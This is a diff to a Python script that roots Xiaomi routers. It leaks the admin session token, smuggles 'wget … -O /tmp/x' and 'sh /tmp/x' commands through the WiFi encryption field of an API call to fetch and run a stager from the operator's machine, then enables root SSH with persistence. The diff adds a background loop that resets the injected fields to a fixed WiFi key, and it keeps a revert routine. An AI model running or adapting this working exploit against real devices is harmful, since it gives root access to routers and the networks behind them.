@@ -275,21 +275,24 @@ sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
 /etc/init.d/dropbear enable
 /etc/init.d/dropbear restart 2>/dev/null
 
-# 7. WiFi 优雅自愈：完全还原为出厂默认的免密开放模式，绝不残留任何固定 WiFi 密码
-for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
-    e=$(uci -q get wireless.$s.encryption 2>/dev/null)
-    case "$e" in *wget*|*tmp/x*|*sh\\ /*)
-        uci -q set wireless.$s.encryption='none'
-        uci -q del wireless.$s.key 2>/dev/null
-        uci commit wireless
-        wifi reload 2>/dev/null
-        ;;
-    esac
-done
-
-# 8. 恢复 Web 出厂向导初始状态
-uci -q set xiaoqiang.common.INITTED='NO'
-uci commit xiaoqiang
+# 7. WiFi 异步自愈守护 (与原作者经过硬件实测验证的标准完全一致，保持 AP 稳定且可用)
+(
+  i=0
+  while [ $i -lt 30 ]; do
+    i=$((i+1)); sleep 5
+    changed=0
+    for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
+      e=$(uci -q get wireless.$s.encryption 2>/dev/null)
+      case "$e" in
+        *wget*|*"sh /tmp"*)
+          uci -q set wireless.$s.encryption='psk2'
+          uci -q set wireless.$s.key='meshpoc12345'
+          changed=1 ;;
+      esac
+    done
+    [ "$changed" = 1 ] && {{ uci -q commit wireless; wifi reload 2>/dev/null; }}
+  done
+) &
 """
 
 # ---- 远程完全撤销与还原 Shell 构造 ----
@@ -328,10 +331,6 @@ uci commit firewall 2>/dev/null
 
 # 7. 锁定 root 用户密码（恢复出厂禁用直接登录状态）
 passwd -l root 2>/dev/null
-
-# 8. 确保 Web 界面处于出厂向导状态
-uci -q set xiaoqiang.common.INITTED='NO'
-uci commit xiaoqiang 2>/dev/null
 """
 
 class StagerServer(http.server.BaseHTTPRequestHandler):
@@ -377,15 +376,29 @@ def execute_remote_payload(host, local_ip, payload_content):
 
     print("\n[+] 步骤 3/4: 提取管理凭据并触发漏洞注入...")
     stok = leak_admin_stok(host)
+
+    # 读取当前 WiFi SSID，保持原有名称不破坏系统结构
+    ssid24, ssid5 = "MiWiFi", "MiWiFi"
+    try:
+        w_info = http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/wifi_detail_all")
+        b_list = w_info.get("info", [])
+        if len(b_list) > 0 and b_list[0].get("ssid"):
+            ssid24 = b_list[0]["ssid"]
+        if len(b_list) > 1 and b_list[1].get("ssid"):
+            ssid5 = b_list[1]["ssid"]
+        else:
+            ssid5 = ssid24
+    except Exception:
+        pass
     
     p_fetch = f'\\" wget http://{local_ip}:{port}/s -O /tmp/x #'
     p_exec = '\\" sh /tmp/x #'
     
     http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_without_restart", {
-        "wifiIndex": "1", "ssid": "MiWiFi", "pwd": "meshpoc12345", "encryption": p_fetch
+        "wifiIndex": "1", "ssid": ssid24, "pwd": "meshpoc12345", "encryption": p_fetch
     })
     http_json(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqnetwork/set_wifi_without_restart", {
-        "wifiIndex": "2", "ssid": "MiWiFi", "pwd": "meshpoc12345", "encryption": p_exec
+        "wifiIndex": "2", "ssid": ssid5, "pwd": "meshpoc12345", "encryption": p_exec
     })
     print("[+] 注入指令已写入，发送 Type-7 信号触发底层 root 权限执行...")
 
@@ -422,12 +435,10 @@ def do_unlock(host, local_ip):
         print(f"  SSH 登录密码: {root_pwd}")
         print(f"  命令行连接:   ssh root@{host}")
         print("=" * 68)
-        print("\n[+] 状态已就绪：无需手动重启路由器！")
-        print("    ★ 此时 SSH 服务已经在后台正常运行，可先连上验证。")
-        print("    ★ 接着您可以打开浏览器访问 http://192.168.31.1 走完设置向导。")
-        print("    ★ 如果设置了【中继模式】，请特别注意：")
-        print("       路由器 IP 会变为主路由分配的 IP（不再是 192.168.31.1），")
-        print("       请去主路由器后台查看新 IP，并使用新 IP 登录 SSH！")
+        print("\n[+] 提示：此时无需手动重启路由器，建议先在终端执行 `ssh root@192.168.31.1` 验证登录！")
+        print("    ★ 随后您可以打开浏览器访问 http://192.168.31.1 进入后台正常修改 WiFi 名称和密码。")
+        print("    ★ 如果设置了【中继模式】：切换后路由器 IP 会变为主路由分配的新 IP，")
+        print("       请去主路由器后台查看新 IP，并使用新 IP 登录 SSH。")
     else:
         print(f"[!] 端口 22 尚未响应，请等待数秒后在终端执行: ssh root@{host}")
 
@@ -441,7 +452,6 @@ def do_revert(host, local_ip):
     print("  3. 完全删除 /data/auto_ssh 持久化目录与脚本。")
     print("  4. 从系统防火墙中移除自启脚本挂载，并清理计划任务。")
     print("  5. 锁定 root 用户密码，恢复为原厂禁用直接登录状态。")
-    print("  6. 确保 Web 页面处于出厂向导状态。")
     print("=" * 68)
 
     confirm = input("\n请确认是否要彻底撤销 Root 并关闭 SSH？[输入 YES 确认，按其他键取消]: ").strip()
